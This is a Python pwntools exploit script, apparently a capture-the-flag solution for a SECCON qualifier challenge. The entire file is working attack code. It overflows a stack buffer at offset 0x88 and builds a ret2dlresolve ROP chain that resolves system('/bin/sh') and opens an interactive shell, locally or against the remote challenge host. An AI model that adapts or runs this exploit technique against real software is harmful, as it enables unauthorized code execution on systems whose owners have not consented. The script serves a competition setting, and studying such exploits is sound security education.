import pwn
elf = pwn.context.binary = pwn.ELF("./chall")
if pwn.args.GDB:
    io = pwn.gdb.debug("./chall", gdbscript='b *main\nc\n')
elif pwn.args.REMOTE:
    io = pwn.remote("hiyoko.quals.seccon.jp", 9001)
else:
    io = elf.process()
pwn.context.update(os='linux', arch='i386')
rop = pwn.ROP(elf)
dlresolve = pwn.Ret2dlresolvePayload(elf, symbol='system', args=["/bin/sh"])
rop.call('gets', [dlresolve.data_addr])
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
pwn.log.info(rop.dump())
io.sendline(pwn.fit({0x88: raw_rop}))
io.sendline(dlresolve.payload)
io.interactive()
